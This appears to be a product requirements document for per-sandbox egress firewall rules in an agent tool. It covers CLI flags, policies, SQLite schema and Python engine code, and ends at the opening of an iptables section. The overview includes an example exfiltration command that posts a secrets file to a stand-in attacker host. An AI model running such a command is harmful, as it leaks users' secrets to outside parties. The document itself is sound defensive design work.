# PRD-094: Per-Sandbox Egress Firewall Rules (CIDR/Hostname Allow/Deny Lists) (`tag sandbox firewall`)

**Status:** Proposed
**Priority:** P3
**Estimated Effort:** M (1-2 weeks)
**Category:** Sandbox & Execution Environment
**Affects:** `sandbox.py`
**Depends on:** PRD-028 (Sandbox Code Execution — provides `sandbox_runs` table, `run_in_sandbox()`, Docker backend), PRD-034 (Secret Scanning — security.py patterns reused for path validation), PRD-013 (Agent Tracing/Observability — violation events emitted as spans), PRD-005 (Execution Backend Selection — profile YAML execution config), PRD-015 (Profile Templates — `network` key in profile YAML)
**Inspired by:** E2B network isolation (`deny_out`/`allow_out` semantics), Daytona network policies, gVisor netstack, Modal `outbound_cidr_allowlist`/`outbound_domain_allowlist`

**GitHub Issue:** #348

---

## 1. Overview

TAG's sandbox subsystem (PRD-028) isolates agent-generated code from the host filesystem and applies resource caps, but it does not constrain *network egress* from the sandbox. A sandboxed process today can open arbitrary TCP connections to any internet host — even when the user runs `--network none` in intent, Docker still creates a bridge network by default unless explicitly removed. An agent executing inside a Docker or restricted-subprocess sandbox can `curl https://evil.example/ -d @/secrets` across an unrestricted loopback or bridge interface, silently exfiltrating data to any endpoint on the internet.

This PRD specifies a per-sandbox egress firewall system: configurable allow/deny rules based on CIDR ranges and hostnames, applied per sandbox invocation or inherited from a named profile's `network` policy. Rules are evaluated in a well-defined precedence order (explicit allow > explicit deny > default policy), enforced via Docker network primitives and iptables rules injected into the container or the host's DOCKER-USER chain, and every attempted connection that violates the active policy is recorded as a violation event in `~/.tag/runtime/tag.sqlite3` and streamed to `~/.tag/runtime/sandbox-firewall.jsonl`.

The feature introduces two enforcement mechanisms that can operate independently or in tandem. The first is *host-level enforcement* via rules added to the `DOCKER-USER` iptables chain before container start and removed after container exit — this works without granting any capability to the container itself. The second is *container-level enforcement* via iptables/nftables inside the container, which requires `NET_ADMIN` capability but survives container network re-configuration and works for the restricted subprocess backend via Linux namespaces. A pure Python DNS-intercept fallback is available for macOS and Windows development environments where iptables is unavailable.

The system ships with four named network profiles — `open` (no restrictions, current behaviour), `restricted` (deny-all egress with an empty allowlist), `pypi` (allow PyPI, GitHub, and common CDNs), and `custom` (user-defined rules stored in SQLite) — so that common use-cases require only a single flag. Per-invocation rule overrides let advanced users compose rules on the command line without touching stored configuration. Violation events carry enough context (sandbox run ID, destination IP, attempted hostname, rule that triggered, timestamp, process PID inside container) to correlate with agent traces and audit logs from PRD-013 and PRD-028.

This feature closes the network exfiltration gap that PRD-028 explicitly deferred as out-of-scope ("TAG does not implement fine-grained egress/ingress firewall rules" — PRD-028 §4 Non-Goal #2). It is directly inspired by E2B's `network={deny_out, allow_out}` parameter on `Sandbox.create()`, Modal's `outbound_cidr_allowlist` / `outbound_domain_allowlist` sandbox parameters, and Daytona's declarative network policy objects. The TAG implementation adapts these concepts to a local Docker + iptables reality while providing a CLI surface consistent with the rest of the `tag sandbox` command group.

---

## 2. Problem Statement

### 2.1 Unrestricted Network Egress Makes Sandbox Isolation Incomplete

PRD-028 was motivated by the OWASP AI Agent Security Cheat Sheet classification of unrestricted shell access as **Dangerous**. The same framework classifies unrestricted network access from a sandboxed agent as equally dangerous. An agent that cannot read `~/.ssh` but *can* reach any internet host can still:

- Send data it read *before* sandboxing began (e.g., environment variables passed as arguments) to an attacker-controlled endpoint
- Download and execute a second-stage payload that escapes the container
- Make authenticated API calls using tokens in environment variables passed into the sandbox
- Participate in a botnet or DDoS attack from the user's IP address

Today `sandbox.py:_run_docker()` passes `--network=none` as a static flag, which prevents *all* networking but also blocks legitimate use-cases like `pip install`, `curl`-ing a public dataset, or calling a public API. The result is that users disable the flag for any real workload — leaving them with zero network protection. A configurable firewall replaces the binary choice between "everything" and "nothing" with a principled allow/deny model.

### 2.2 Shared Profiles Lack Reproducible Network Security Postures

When a profile is shared between users or committed to a team repository, the `execution` block of the profile YAML specifies the sandbox backend and resource limits but says nothing about network policy. A team that wants all `coder` agent runs to be blocked from reaching any endpoint except `api.github.com` and `pypi.org` has no way to encode that constraint in the profile today. Every developer who uses that profile gets a different (often unrestricted) network posture depending on how they invoked `tag sandbox run`.

The `network` key in profile YAML, backed by stored firewall rules in SQLite, gives teams a single declarative source of truth for the network security posture of each profile — version-controlled, auditable, and consistently applied across all machines that load the profile.

### 2.3 Violation Blindness Prevents Incident Response

Even when `--network=none` is effective, there is no record of *attempted* connections. If a sandboxed agent tries to phone home and fails (due to the network restriction), no event is written anywhere. Post-incident forensic analysis of a suspicious run has no network-layer evidence — the auditor can see what commands were executed (from `sandbox_runs`) but not what connections were attempted and blocked.

The violation logging system in this PRD fills that gap: every blocked connection attempt is appended to `sandbox_firewall_violations` in SQLite and to the JSONL audit log, with enough metadata (destination, rule, run ID, PID, timestamp) to reconstruct the connection timeline for a given sandbox run.

---

## 3. Goals

| # | Goal |
|---|------|
| G1 | Allow users to specify per-invocation egress rules via `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, and `--deny-all` / `--allow-all` flags on `tag sandbox run`. |
| G2 | Allow users to store named firewall policies attached to profiles via `tag sandbox firewall add --profile <name>` and have those policies applied automatically on every `tag sandbox run` for that profile. |
| G3 | Ship four built-in named network profiles: `open`, `restricted`, `pypi`, `custom`; selectable via `--network <name>` on `tag sandbox run`. |
| G4 | Enforce rules via host-level iptables DOCKER-USER chain for Docker backend, and via Python DNS intercept + TCP socket patching for the restricted subprocess backend. |
| G5 | Log every violation (blocked connection attempt) to `sandbox_firewall_violations` in SQLite and to `~/.tag/runtime/sandbox-firewall.jsonl`, with run_id, destination, triggered_rule, and timestamp. |
| G6 | Emit violation events as OpenTelemetry spans (PRD-013 tracing integration) so they appear in `tag trace show`. |
| G7 | Default-deny for profiles configured with `network: restricted` in profile YAML; default-allow for all other profiles (preserving current behaviour). |
| G8 | Support CIDR notation (`10.0.0.0/8`, `0.0.0.0/0`) and hostname/wildcard patterns (`api.github.com`, `*.pypi.org`, `*`) in both allow and deny lists. |
| G9 | Provide `tag sandbox firewall list`, `tag sandbox firewall show`, `tag sandbox firewall remove`, and `tag sandbox firewall test` subcommands for managing and validating stored policies. |
| G10 | All iptables rules are scoped to a per-sandbox chain named `TAG-SBX-<run_id[:8]>` and are unconditionally removed after the sandbox exits, even on SIGINT or crash. |

---

## 4. Non-Goals

| # | Non-Goal |
|---|----------|
| NG1 | Ingress firewall rules (inbound connections to the sandbox). TAG sandboxes do not serve traffic; ingress control is not needed for the threat model addressed here. |
| NG2 | Deep packet inspection or TLS SNI interception for hostname matching against encrypted traffic. Hostname matching is resolved at DNS query time (via DNS intercept) and at TCP connect time (via destination IP + reverse-DNS lookup); payload inspection is out of scope. |
| NG3 | Kubernetes NetworkPolicy or CNI plugin integration. This PRD targets local Docker and restricted subprocess backends only. |
| NG4 | Windows support for iptables-based enforcement. The DNS-intercept fallback path applies on Windows; iptables enforcement is Linux-only. |
| NG5 | Rate limiting or bandwidth throttling of allowed connections. Only allow/deny at the connection level is in scope. |
| NG6 | IPv6 firewall rules in v1. The implementation uses ip6tables stubs but does not guarantee IPv6 enforcement correctness. |
| NG7 | Automatic rule generation from agent intent (e.g., "agent says it needs PyPI, TAG should auto-allow it"). Rules are always explicitly configured by the human operator. |
| NG8 | Cross-sandbox shared-state rules or network namespaces that allow sandbox-to-sandbox communication. Each sandbox gets an independent chain. |

---

## 5. Success Metrics

| Metric | Target | Measurement Method |
|--------|--------|--------------------|
| Blocked connection latency overhead | < 2 ms added to sandbox startup per rule applied | Benchmark: time 50 sandbox starts with 10-rule policy vs. baseline |
| Violation log completeness | 100% of blocked TCP connections appear in `sandbox_firewall_violations` | Integration test: attempt 20 distinct blocked connections; assert all 20 rows written |
| Rule enforcement accuracy | Zero false negatives (allowed traffic to denied destinations) in test suite | Integration test suite with 30 deny-rule scenarios |
| Chain cleanup reliability | 0 orphaned `TAG-SBX-*` iptables chains after 100 sandbox runs including forced kills | Shell test: `iptables -L | grep TAG-SBX` after test run = empty |
| Policy apply time (Docker) | Firewall rules applied within 500 ms of container creation | Benchmark: time from `docker run` invocation to first blocked packet |
| SQLite write latency | Violation row inserted within 50 ms of blocked connection event | Benchmark: measure DB write latency for 1000 simulated violations |
| CLI surface coverage | All 7 `tag sandbox firewall` subcommands present and return exit 0 for happy path | Automated CLI test suite |
| User adoption friction | User can apply `--network restricted` in a single flag with no additional config | Manual usability test with 3 developers |

---

## 6. User Stories

| ID | As a… | I want to… | So that… |
|----|-------|-----------|----------|
| U1 | Security-conscious developer | run `tag sandbox run --code "pip install requests && python script.py" --allow-host pypi.org --deny-all` | the agent can fetch from PyPI but cannot reach any other internet host, closing the exfiltration vector |
| U2 | Team lead | set `network: restricted` in my team's `coder` profile YAML | every developer on the team gets the same restrictive network posture without needing to remember CLI flags |
| U3 | Platform engineer | run `tag sandbox firewall add --profile coder --allow "api.github.com,pypi.org,files.pythonhosted.org" --deny "*"` | I can store the team's approved egress list in the database and have it applied automatically |
| U4 | Security auditor | run `tag sandbox firewall violations --run-id abc123def456` after a suspicious run | I can see every blocked connection attempt with destination IP, triggered rule, timestamp, and PID |
| U5 | Developer | use `--network pypi` shorthand | I get a pre-configured policy that allows PyPI, GitHub, and common CDNs without listing each host manually |
| U6 | DevOps engineer | run `tag sandbox firewall test --profile coder --destination "evil.example.com"` | I can verify that the stored policy actually blocks the target before relying on it in production |
| U7 | Developer | run `tag sandbox firewall list` | I can see all stored named policies with their allow/deny rules in a single view |
| U8 | Incident responder | grep `~/.tag/runtime/sandbox-firewall.jsonl` for a run ID | I can reconstruct the full network connection timeline for a suspicious sandbox run even hours after it completed |
| U9 | Developer | use `tag sandbox run --network open` explicitly | I can opt out of any profile-level firewall for a specific invocation without modifying the profile |
| U10 | Developer | receive a clear error message when an allowed host is unreachable vs. when it is blocked by firewall | I can distinguish between network connectivity issues and firewall configuration problems during debugging |

---

## 7. Proposed CLI Surface

### 7.1 `tag sandbox run` — Egress Flag Extensions

New flags added to the existing `tag sandbox run` command:

```
tag sandbox run \
  --code "pip install httpx && python -c 'import httpx; print(httpx.get(\"https://api.github.com\").status_code)'" \
  [--allow-host api.github.com,files.pythonhosted.org,pypi.org] \
  [--allow-cidr 198.18.0.0/15] \
  [--deny-host evil.example.com,*.badactor.net] \
  [--deny-cidr 169.254.0.0/16,100.64.0.0/10] \
  [--deny-all]          # equivalent to --deny-cidr 0.0.0.0/0 plus --deny-cidr ::/0
  [--allow-all]         # explicit no-op; resets to open policy (overrides profile default)
  [--network open|restricted|pypi|custom|<policy_name>]   # named policy
  [--backend docker|restricted]
```

**Flag precedence (highest to lowest):**
1. Per-invocation `--allow-host` / `--allow-cidr` (always wins)
2. Per-invocation `--deny-host` / `--deny-cidr` / `--deny-all`
3. Named `--network <policy>` rules
4. Profile-level `network:` key from profile YAML
5. Default policy (`open` — allow all)

**Example — restricted with selective allow:**
```bash
tag sandbox run \
  --code "python fetch.py" \
  --network restricted \
  --allow-host api.github.com \
  --allow-host pypi.org \
  --allow-host files.pythonhosted.org
```

**Example — deny a specific CIDR while otherwise open:**
```bash
tag sandbox run \
  --code "python scan.py" \
  --deny-cidr 169.254.169.254/32   # block AWS IMDS
```

**Example — use built-in pypi policy:**
```bash
tag sandbox run --code "pip install pandas" --network pypi
```

**Output (when violations occur during the run):**
```
[sandbox:abc123] RUNNING python fetch.py
[firewall] BLOCKED tcp connect to 8.8.8.8:53 — matched deny rule: 0.0.0.0/0 (run: abc123def4)
[sandbox:abc123] EXIT 1 (1.23s)

Firewall violations: 1
  1. 2026-06-17T10:22:31Z  tcp  8.8.8.8:53  rule=deny:0.0.0.0/0  pid=42
```

---

### 7.2 `tag sandbox firewall add`

Store a named firewall policy associated with a profile:

```
tag sandbox firewall add \
  --profile <profile_name> \
  [--policy-name <name>]              # default: profile_name
  --allow "<host1>,<host2>,..."       # comma-separated hosts or CIDRs
  --deny "<host1>,*,..."              # comma-separated hosts, CIDRs, or * for deny-all
  [--description "Policy description"]
  [--replace]                         # overwrite existing policy with same name
```

**Example:**
```bash
tag sandbox firewall add \
  --profile coder \
  --allow "api.github.com,pypi.org,files.pythonhosted.org,*.githubusercontent.com" \
  --deny "*" \
  --description "Coder profile: PyPI + GitHub only"
```

**Output:**
```
Firewall policy saved.
  Profile:     coder
  Policy name: coder
  Allow:       api.github.com, pypi.org, files.pythonhosted.org, *.githubusercontent.com
  Deny:        * (deny-all default)
  Default:     deny
  Created:     2026-06-17T10:25:00Z
  ID:          fw_7f3a9b2c
```

---

### 7.3 `tag sandbox firewall list`

List all stored firewall policies:

```
tag sandbox firewall list [--profile <name>] [--json]
```

**Output (table):**
```
ID           Profile    Policy Name  Default  Allow Rules  Deny Rules  Created
fw_7f3a9b2c  coder      coder        deny     4            1           2026-06-17
fw_1a2b3c4d  researcher researcher   allow    0            2           2026-06-15
(built-in)   —          open         allow    *            —           —
(built-in)   —          restricted   deny     —            *           —
(built-in)   —          pypi         deny     13           1           —
```

---

### 7.4 `tag sandbox firewall show`

Show full details of a stored policy:

```
tag sandbox firewall show <policy_name_or_id> [--json]
```

**Output:**
```
Policy: coder (fw_7f3a9b2c)
Profile: coder
Default policy: deny
Description: Coder profile: PyPI + GitHub only
Created: 2026-06-17T10:25:00Z

Allow rules (4):
  host  api.github.com
  host  pypi.org
  host  files.pythonhosted.org
  host  *.githubusercontent.com  [wildcard]

Deny rules (1):
  cidr  0.0.0.0/0  [deny-all]
```

---

### 7.5 `tag sandbox firewall remove`

Remove a stored policy:

```
tag sandbox firewall remove <policy_name_or_id> [--profile <name>] [--yes]
```

**Output:**
```
Removed firewall policy 'coder' (fw_7f3a9b2c).
Warning: profile 'coder' referenced this policy via network: coder.
  The profile will fall back to the 'open' (default-allow) policy.
  Update the profile YAML network key to suppress this warning.
```

---

### 7.6 `tag sandbox firewall test`

Dry-run test whether a destination would be allowed or denied by a policy:

```
tag sandbox firewall test \
  --profile <name>|--policy <name_or_id> \
  --destination <hostname_or_ip>[:<port>] \
  [--proto tcp|udp]
```

**Output (blocked):**
```
Result: BLOCKED
  Destination:    evil.example.com (resolved: 203.0.113.42)
  Matched rule:   deny host * (deny-all)
  Policy:         coder (default: deny)
  Evaluation:
    1. Check allow rules for 203.0.113.42... no match
    2. Check deny rules for evil.example.com... matched: deny:*
    → DENY
```

**Output (allowed):**
```
Result: ALLOWED
  Destination:    api.github.com (resolved: 140.82.121.5)
  Matched rule:   allow host api.github.com
  Policy:         coder (default: deny)
  Evaluation:
    1. Check allow rules for api.github.com... matched: allow:api.github.com
    → ALLOW
```

---

### 7.7 `tag sandbox firewall violations`

Query the violations log:

```
tag sandbox firewall violations \
  [--run-id <run_id>] \
  [--since <ISO8601_or_relative>]   # e.g. "1h", "2026-06-17"
  [--limit 50]
  [--json]
```

**Output:**
```
Firewall violations (run: abc123def456, 3 events)

Time                      Proto  Destination          Port  Rule              PID
2026-06-17T10:22:31Z      tcp    8.8.8.8              53    deny:0.0.0.0/0    42
2026-06-17T10:22:31Z      tcp    169.254.169.254      80    deny:0.0.0.0/0    42
2026-06-17T10:22:45Z      tcp    evil.example.com     443   deny:*            43
```

---

## 8. Functional Requirements

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-01 | `tag sandbox run` MUST accept `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, and `--network` flags. Unrecognised values MUST produce a clear error. | P0 |
| FR-02 | The firewall engine MUST evaluate rules in order: explicit per-invocation allow > explicit per-invocation deny > named policy allow > named policy deny > profile-level default > global default (`open`). | P0 |
| FR-03 | For the Docker backend, egress rules MUST be enforced via iptables `TAG-SBX-<run_id[:8]>` chains inserted into `DOCKER-USER` before container start. | P0 |
| FR-04 | For the restricted subprocess backend, egress rules MUST be enforced via Python-level DNS intercept (`socket.getaddrinfo` monkey-patching) and `socket.connect` hook inside a forked subprocess. | P0 |
| FR-05 | All iptables chains created for a sandbox run MUST be unconditionally removed after the run exits, including on SIGINT, SIGTERM, and unhandled exception. Use `atexit.register` + signal handlers. | P0 |
| FR-06 | Hostname rules MUST support exact match (`api.github.com`) and single-level wildcard (`*.github.com`). Multi-level wildcards (`**.github.com`) are NOT required in v1. | P1 |
| FR-07 | CIDR rules MUST use Python's `ipaddress.ip_network()` for parsing and `ip_address in network` for matching. Invalid CIDR notation MUST raise a validation error before sandbox start. | P0 |
| FR-08 | Every blocked connection attempt MUST produce a `sandbox_firewall_violations` row within 50 ms of the block event, containing: `run_id`, `proto`, `destination_host`, `destination_ip`, `destination_port`, `triggered_rule`, `pid`, `violated_at`. | P0 |
| FR-09 | Every blocked connection attempt MUST be appended to `~/.tag/runtime/sandbox-firewall.jsonl` as a newline-delimited JSON object with the same fields as FR-08. | P1 |
| FR-10 | `tag sandbox firewall add` MUST validate all hostnames and CIDRs at save time. It MUST reject rules that would permanently block localhost (127.0.0.0/8) to prevent misconfiguration that breaks the sandbox itself. | P1 |
| FR-11 | The four built-in named policies (`open`, `restricted`, `pypi`, `custom`) MUST be immutable. Attempts to overwrite them MUST produce an error; users must use `--policy-name` to create a custom policy. | P1 |
| FR-12 | The `pypi` built-in policy MUST allow: `pypi.org`, `files.pythonhosted.org`, `api.github.com`, `github.com`, `objects.githubusercontent.com`, `*.github.com`, `cdn.jsdelivr.net`, `registry.npmjs.org`, `registry.yarnpkg.com`, `dl-cdn.alpinelinux.org`, `deb.debian.org`, `security.debian.org`, `archive.ubuntu.com`, `security.ubuntu.com`, and `*.cloudfront.net`. | P2 |
| FR-13 | `tag sandbox firewall test` MUST perform real DNS resolution of the destination hostname and evaluate the result against both the resolved IP and the hostname. It MUST NOT make any actual TCP connection. | P1 |
| FR-14 | When a profile YAML contains `network: restricted` (or any named policy), `run_in_sandbox()` MUST load the corresponding policy from SQLite before applying per-invocation rule overrides. | P0 |
| FR-15 | Violation events MUST be emitted as OpenTelemetry spans with `sandbox.firewall.violation` event name and attributes: `sandbox.run_id`, `network.peer.address`, `network.peer.port`, `firewall.rule`, `process.pid`. | P2 |
| FR-16 | `tag sandbox firewall violations` MUST support filtering by `--run-id`, `--since`, and `--limit`. When `--json` is given, output MUST be a JSON array of violation objects. | P1 |
| FR-17 | On macOS where `iptables` is unavailable, the Docker backend MUST fall back to the DNS-intercept mechanism by injecting the firewall shim as a bind-mounted script sourced from `PYTHONSTARTUP`. A warning MUST be printed when iptables is unavailable. | P2 |
| FR-18 | Profile YAML `network` key MUST accept both built-in policy names and custom policy names stored in SQLite. Loading a profile with an unknown `network` value MUST warn but MUST NOT fail the sandbox run (falls back to `open`). | P1 |

---

## 9. Non-Functional Requirements

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-01 | Sandbox startup overhead from firewall rule application MUST be < 200 ms for Docker backend (iptables chain creation) and < 10 ms for restricted subprocess backend (Python hook setup). | Benchmark |
| NFR-02 | Violation log writes MUST be non-blocking from the sandbox process's perspective. Use a background thread with a queue for SQLite writes; sandbox blocking on DB I/O is not acceptable. | Architecture |
| NFR-03 | The firewall module MUST have zero imports at module load time for packages not in the Python standard library. `ipaddress`, `socket`, `threading`, `queue`, and `subprocess` are the only permitted top-level imports. | Code review |
| NFR-04 | All iptables subprocess calls MUST have a 5-second timeout and MUST NOT block sandbox startup if iptables is unavailable or returns an error. Failures fall back to `open` policy with a logged warning. | Code review |
| NFR-05 | The `sandbox_firewall_violations` table MUST be indexed on `(run_id, violated_at)` and `violated_at` to support efficient time-range queries without full table scans. | Schema |
| NFR-06 | The JSONL audit log MUST be append-only and MUST NOT be truncated by TAG operations. Rotation is the user's responsibility. | Architecture |
| NFR-07 | Firewall rule removal (iptables chain flush + delete) MUST complete within 1 second of sandbox exit for chains with up to 1000 rules. | Benchmark |
| NFR-08 | The feature MUST be fully functional on Python 3.11+ and MUST NOT require any new mandatory dependencies in `pyproject.toml`. Optional iptables CLI dependency is documented. | Compatibility |
| NFR-09 | All user-facing error messages related to firewall misconfiguration MUST suggest the corrective action (e.g., "Invalid CIDR '10.0.x.y/24': use dotted-decimal notation like '10.0.0.0/24'"). | UX |
| NFR-10 | The SQLite WAL-mode database used by all sandbox tables MUST handle concurrent writes from the violation logger thread and the main thread without SQLITE_BUSY errors. Use `timeout=5` in `open_db()` and WAL mode. | Architecture |

---

## 10. Technical Design

### 10.1 New Files and Modifications

| File | Change |
|------|--------|
| `src/tag/sandbox.py` | Primary implementation: firewall engine, iptables manager, DNS intercept, violation logger |
| `src/tag/controller.py` | New `cmd_sandbox_firewall_*` commands; extend `cmd_sandbox_run` to parse firewall flags |
| `~/.tag/runtime/tag.sqlite3` | New tables: `sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations` |
| `~/.tag/runtime/sandbox-firewall.jsonl` | Append-only JSONL violation audit log (new file, created on first violation) |

### 10.2 SQLite DDL

```sql
-- Stored named firewall policies
CREATE TABLE IF NOT EXISTS sandbox_firewall_policies (
    id           TEXT PRIMARY KEY,          -- 'fw_' + hex(8)
    name         TEXT NOT NULL UNIQUE,      -- user-visible name ('coder', 'pypi', etc.)
    profile_name TEXT,                      -- NULL for global/standalone policies
    default_action TEXT NOT NULL            -- 'allow' | 'deny'
        CHECK(default_action IN ('allow', 'deny')),
    description  TEXT NOT NULL DEFAULT '',
    is_builtin   INTEGER NOT NULL DEFAULT 0, -- 1 for built-in policies (immutable)
    created_at   TEXT NOT NULL,
    updated_at   TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_sfp_profile
    ON sandbox_firewall_policies(profile_name);

-- Individual rules belonging to a policy (ordered by priority)
CREATE TABLE IF NOT EXISTS sandbox_firewall_rules (
    id           TEXT PRIMARY KEY,          -- 'fwr_' + hex(8)
    policy_id    TEXT NOT NULL
        REFERENCES sandbox_firewall_policies(id) ON DELETE CASCADE,
    action       TEXT NOT NULL             -- 'allow' | 'deny'
        CHECK(action IN ('allow', 'deny')),
    rule_type    TEXT NOT NULL             -- 'host' | 'cidr' | 'wildcard'
        CHECK(rule_type IN ('host', 'cidr', 'wildcard')),
    value        TEXT NOT NULL,            -- 'api.github.com' | '10.0.0.0/8' | '*.github.com'
    priority     INTEGER NOT NULL DEFAULT 100, -- lower = evaluated first
    created_at   TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_sfr_policy_priority
    ON sandbox_firewall_rules(policy_id, priority, action);

-- Violation events (blocked connection attempts)
CREATE TABLE IF NOT EXISTS sandbox_firewall_violations (
    id               TEXT PRIMARY KEY,      -- 'sfv_' + hex(8)
    run_id           TEXT NOT NULL,         -- FK to sandbox_runs.id
    proto            TEXT NOT NULL DEFAULT 'tcp'
        CHECK(proto IN ('tcp', 'udp', 'icmp', 'unknown')),
    destination_host TEXT,                  -- original hostname (may be NULL if direct IP)
    destination_ip   TEXT NOT NULL,
    destination_port INTEGER,
    triggered_rule   TEXT NOT NULL,         -- human-readable: 'deny:0.0.0.0/0', 'deny:host:*'
    pid              INTEGER,               -- PID inside container/subprocess
    violated_at      TEXT NOT NULL          -- ISO8601 UTC
);

CREATE INDEX IF NOT EXISTS idx_sfv_run_time
    ON sandbox_firewall_violations(run_id, violated_at);
CREATE INDEX IF NOT EXISTS idx_sfv_time
    ON sandbox_firewall_violations(violated_at);
```

### 10.3 Core Dataclasses

```python
from __future__ import annotations
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
import ipaddress


class FirewallAction(str, Enum):
    ALLOW = "allow"
    DENY = "deny"


class RuleType(str, Enum):
    HOST = "host"          # exact hostname: api.github.com
    CIDR = "cidr"          # IP range: 10.0.0.0/8
    WILDCARD = "wildcard"  # single-level wildcard: *.github.com


@dataclass
class FirewallRule:
    action: FirewallAction
    rule_type: RuleType
    value: str              # raw value as entered
    priority: int = 100
    id: Optional[str] = None
    policy_id: Optional[str] = None
    created_at: Optional[str] = None

    # Parsed form, populated by validate()
    _cidr_network: Optional[ipaddress.IPv4Network | ipaddress.IPv6Network] = field(
        default=None, repr=False
    )

    def validate(self) -> None:
        """Parse and validate the rule value. Raises ValueError on bad input."""
        if self.rule_type == RuleType.CIDR:
            self._cidr_network = ipaddress.ip_network(self.value, strict=False)
        elif self.rule_type == RuleType.WILDCARD:
            if not self.value.startswith("*."):
                raise ValueError(
                    f"Wildcard rules must start with '*.' — got {self.value!r}"
                )
        elif self.rule_type == RuleType.HOST:
            if "*" in self.value:
                raise ValueError(
                    f"Use rule_type=wildcard for patterns containing '*' — got {self.value!r}"
                )

    def matches_host(self, hostname: str) -> bool:
        """Return True if this rule's value matches the given hostname."""
        if self.rule_type == RuleType.HOST:
            return hostname.lower() == self.value.lower()
        if self.rule_type == RuleType.WILDCARD:
            suffix = self.value[1:]   # strip leading '*'
            return hostname.lower().endswith(suffix.lower())
        return False  # CIDR rules matched separately via matches_ip()

    def matches_ip(self, addr: str) -> bool:
        """Return True if this CIDR rule contains the given IP address."""
        if self.rule_type != RuleType.CIDR or self._cidr_network is None:
            return False
        try:
            return ipaddress.ip_address(addr) in self._cidr_network
        except ValueError:
            return False


@dataclass
class FirewallPolicy:
    name: str
    default_action: FirewallAction = FirewallAction.ALLOW
    allow_rules: list[FirewallRule] = field(default_factory=list)
    deny_rules: list[FirewallRule] = field(default_factory=list)
    id: Optional[str] = None
    profile_name: Optional[str] = None
    description: str = ""
    is_builtin: bool = False

    def evaluate(self, hostname: Optional[str], ip: str) -> FirewallAction:
        """
        Evaluate the policy for a connection to (hostname, ip).
        Precedence: explicit allow > explicit deny > default_action.
        """
        # Check allow rules first (allow overrides deny)
        for rule in sorted(self.allow_rules, key=lambda r: r.priority):
            if (hostname and rule.matches_host(hostname)) or rule.matches_ip(ip):
                return FirewallAction.ALLOW

        # Check deny rules
        for rule in sorted(self.deny_rules, key=lambda r: r.priority):
            if (hostname and rule.matches_host(hostname)) or rule.matches_ip(ip):
                return FirewallAction.DENY

        return self.default_action


@dataclass
class FirewallViolation:
    run_id: str
    destination_ip: str
    triggered_rule: str
    violated_at: str
    proto: str = "tcp"
    destination_host: Optional[str] = None
    destination_port: Optional[int] = None
    pid: Optional[int] = None
    id: Optional[str] = None


@dataclass
class SandboxFirewallConfig:
    """
    Resolved firewall configuration for a single sandbox invocation.
    Merges profile-level policy with per-invocation overrides.
    """
    policy: FirewallPolicy
    # Per-invocation overrides (applied on top of policy before evaluation)
    extra_allow_hosts: list[str] = field(default_factory=list)
    extra_deny_hosts: list[str] = field(default_factory=list)
    extra_allow_cidrs: list[str] = field(default_factory=list)
    extra_deny_cidrs: list[str] = field(default_factory=list)
    deny_all: bool = False      # shorthand for extra_deny_cidrs = ['0.0.0.0/0']
    allow_all: bool = False     # override to open policy for this invocation
```

### 10.4 Firewall Engine

```python
class FirewallEngine:
    """
    Resolves and evaluates the active firewall policy for a sandbox run.
    Handles rule merging, DNS resolution, and violation logging.
    """

    def __init__(
        self,
        config: SandboxFirewallConfig,
        violation_queue: "queue.Queue[FirewallViolation]",
        run_id: str,
    ) -> None:
        self._config = config
        self._queue = violation_queue
        self._run_id = run_id

    def evaluate_connection(
        self,
        hostname: Optional[str],
        ip: str,
        port: int,
        proto: str = "tcp",
        pid: Optional[int] = None,
    ) -> FirewallAction:
        """
        Evaluate whether a connection should be allowed or denied.
        Logs a violation if denied.
        """
        if self._config.allow_all:
            return FirewallAction.ALLOW

        # Build merged policy: per-invocation overrides take highest priority
        if self._config.deny_all:
            # Only per-invocation allow rules can save this connection
            for host in self._config.extra_allow_hosts:
                if hostname and self._host_matches(hostname, host):
                    return FirewallAction.ALLOW
            for cidr in self._config.extra_allow_cidrs:
                if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
                    return FirewallAction.ALLOW
            action = FirewallAction.DENY
            triggered = "deny:invocation:deny-all"
        else:
            # Evaluate per-invocation allows
            for host in self._config.extra_allow_hosts:
                if hostname and self._host_matches(hostname, host):
                    return FirewallAction.ALLOW
            for cidr in self._config.extra_allow_cidrs:
                if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
                    return FirewallAction.ALLOW

            # Delegate to stored policy
            action = self._config.policy.evaluate(hostname, ip)
            triggered = self._find_triggered_rule(hostname, ip, action)

            # Apply per-invocation denies on top of policy allows
            if action == FirewallAction.ALLOW:
                for host in self._config.extra_deny_hosts:
                    if hostname and self._host_matches(hostname, host):
                        action = FirewallAction.DENY
                        triggered = f"deny:invocation:host:{host}"
                        break
                for cidr in self._config.extra_deny_cidrs:
                    if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
                        action = FirewallAction.DENY
                        triggered = f"deny:invocation:cidr:{cidr}"
                        break

        if action == FirewallAction.DENY:
            import datetime
            violation = FirewallViolation(
                run_id=self._run_id,
                destination_ip=ip,
                destination_host=hostname,
                destination_port=port,
                proto=proto,
                triggered_rule=triggered,
                pid=pid,
                violated_at=datetime.datetime.now(datetime.timezone.utc).isoformat(),
            )
            self._queue.put_nowait(violation)

        return action

    @staticmethod
    def _host_matches(hostname: str, pattern: str) -> bool:
        if pattern == "*":
            return True
        if pattern.startswith("*."):
            return hostname.endswith(pattern[1:]) or hostname == pattern[2:]
        return hostname.lower() == pattern.lower()

    def _find_triggered_rule(
        self, hostname: Optional[str], ip: str, action: FirewallAction
    ) -> str:
        rules = (
            self._config.policy.allow_rules
            if action == FirewallAction.ALLOW
            else self._config.policy.deny_rules
        )
        for rule in sorted(rules, key=lambda r: r.priority):
            if (hostname and rule.matches_host(hostname)) or rule.matches_ip(ip):
                return f"{rule.action.value}:{rule.rule_type.value}:{rule.value}"
        return f"{action.value}:default"
```

### 10.5 Host-Level iptables Enforcement (Docker Backend)

```python
import subprocess
import atexit
import uuid

IPTABLES = "iptables"   # or "ip6tables" for IPv6
CHAIN_PREFIX = "TAG-SBX-"


